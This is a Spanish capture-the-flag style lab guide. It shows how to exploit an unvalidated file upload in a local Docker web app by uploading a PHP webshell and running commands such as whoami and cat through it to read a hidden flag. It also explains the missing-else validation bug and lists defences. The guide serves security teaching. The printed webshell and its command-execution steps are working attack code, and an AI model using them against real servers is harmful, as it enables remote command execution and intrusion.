# 📖 Guía — Lab 3: Explotación web por subida de archivos

**Categoría:** 🟡 MEDIUM  
**Técnica:** File upload sin validación + webshell + RCE  
**Dificultad:** ⭐⭐⭐ Media  

---

## 🎯 Objetivo

Explotar una aplicación web que permite subir archivos sin validarlos correctamente,  
subiendo una **webshell PHP** para conseguir ejecución remota de comandos (RCE)  
y obtener la flag oculta en el servidor.

**Flag final:** `/var/www/html/.flag` (archivo oculto, accesible vía webshell)

---

## 🧠 Conceptos previos

**¿Qué es una webshell?**  
Es un archivo (normalmente `.php`, `.asp` o `.jsp`) que, una vez subido a un servidor,  
permite ejecutar comandos del sistema operativo desde el navegador.  
Es una de las técnicas de post-explotación más comunes tras una vulnerabilidad de subida de archivos.

**¿Por qué es peligrosa la subida sin validación?**  
Muchas aplicaciones permiten subir imágenes o documentos pero solo comprueban  
la extensión del nombre del archivo, no el contenido real. Un atacante puede  
renombrar un archivo `.php` para que parezca inofensivo o simplemente saltarse  
una validación mal implementada.

Esta vulnerabilidad forma parte del **OWASP Top 10** bajo la categoría  
*A04 - Insecure Design* y *A03 - Injection*.

---

## 🚀 Levantar el laboratorio

```bash
./launch.sh lab3
```

O manualmente:
```bash
cd labs/medium/lab3-upload
./build_and_run.sh
```

Acceder en el navegador:
```
http://127.0.0.1:8888
```

---

## 🔍 Solución paso a paso

### Paso 1 — Reconocimiento de la aplicación web

Abre `http://127.0.0.1:8888` en tu navegador.

Observa:
- ¿Qué hace la aplicación?
- ¿Qué campos tiene el formulario?
- ¿A qué URL envía los datos? (revisa el código fuente con `Ctrl+U`)
- ¿Qué método usa? ¿GET o POST?

> 💡 El código fuente de una página web es información pública. En un pentest real,  
> siempre se revisa antes de interactuar con la aplicación.

---

### Paso 2 — Probar la subida normal

Primero, comprueba cómo funciona la aplicación con un archivo legítimo:

1. Crea un archivo de prueba: `echo "test" > prueba.txt`
2. Súbelo mediante el formulario
3. Observa la respuesta: ¿dónde se guarda? ¿qué URL devuelve?

Esto te dice dónde van a parar los archivos subidos.

---

### Paso 3 — Crear la webshell

En tu máquina, crea un archivo llamado `shell.php` con este contenido:

```php
<?php
if (isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

Este archivo, cuando se acceda desde el navegador con el parámetro `?cmd=`,  
ejecutará el comando que le pases y mostrará el resultado.

---

### Paso 4 — Subir la webshell

Usa el formulario de la aplicación para subir `shell.php`.

La aplicación tiene una validación, pero está mal implementada.  
Intenta subir el archivo directamente y observa si lo acepta.

> 💡 Si la aplicación rechaza el archivo, investiga qué comprueba exactamente.  
> ¿Valida la extensión? ¿El contenido? ¿El nombre completo?  
> A veces basta con añadir algo al nombre del archivo para saltarse la validación.

---

### Paso 5 — Acceder a la webshell y ejecutar comandos

Una vez subida, accede a la URL donde se guardó el archivo:

```
http://127.0.0.1:8888/uploads/shell.php?cmd=whoami
```

Si ves una respuesta del sistema operativo, tienes **ejecución remota de comandos (RCE)**.

Prueba más comandos:
```
?cmd=id
?cmd=uname -a
?cmd=ls -la /var/www/html/
?cmd=ls -la /var/www/html/uploads/
```

---

### Paso 6 — Encontrar y leer la flag

La flag está en un archivo oculto en el servidor.  
En Linux, los archivos que empiezan por `.` son ocultos (no aparecen con `ls` normal).

```
http://127.0.0.1:8888/uploads/shell.php?cmd=ls -la /var/www/html/
```

Cuando encuentres el archivo:

```
http://127.0.0.1:8888/uploads/shell.php?cmd=cat /var/www/html/.flag
```

---

## ✅ Verificación

Si has completado el lab correctamente verás:

```
FLAG{...}
```

---

## 🧩 ¿Por qué funciona esto?

La aplicación usa `strpos()` para comprobar si el nombre del archivo contiene  
una extensión permitida (`.jpg`, `.png`, etc.). El problema es que:

1. `strpos("shell.php", ".jpg")` devuelve `false` — la extensión no está
2. La variable `$es_valido` se queda en `false`
3. **Pero** el código llama a `move_uploaded_file()` igualmente porque no hay un `else` que lo bloquee

Es un error de lógica: la validación existe pero no se aplica correctamente.  
En una aplicación segura, si `$es_valido` es `false`, el archivo **no debe moverse**.

---

## 🔐 ¿Cómo se defendería esto en la vida real?

Una aplicación segura haría al menos esto:
- Validar el tipo MIME real del archivo (no solo el nombre)
- Renombrar el archivo al subirlo (para que no sea ejecutable)
- Guardar los archivos fuera del directorio web
- Configurar el servidor para no ejecutar scripts en la carpeta de uploads

---

## 🛠️ Solución de problemas

| Problema | Posible causa | Solución |
|---|---|---|
| El `.php` se descarga en vez de ejecutarse | PHP no activo en Apache | Verificar que `libapache2-mod-php` está en el Dockerfile |
| Error 403 al acceder a `/uploads/` | Permisos incorrectos | Verificar `chmod 777` en el Dockerfile |
| `shell_exec` devuelve vacío | Función deshabilitada | Cambiar a `system($_GET['cmd'])` en la webshell |
| No se ve `.flag` con `ls` | Es un archivo oculto | Usar `ls -la` para ver archivos que empiezan por `.` |
| Puerto 8888 ocupado | Otro proceso | Cambiar a `-p 8889:80` en el script |

---

## 📚 Recursos para aprender más

- [OWASP - File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) — vulnerabilidad explicada
- [PayloadsAllTheThings - File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files) — técnicas avanzadas
- [GTFOBins](https://gtfobins.github.io) — útil si consigues una shell interactiva

---

*Laboratorio parte del proyecto [Lab Provisioner](../README.md)*
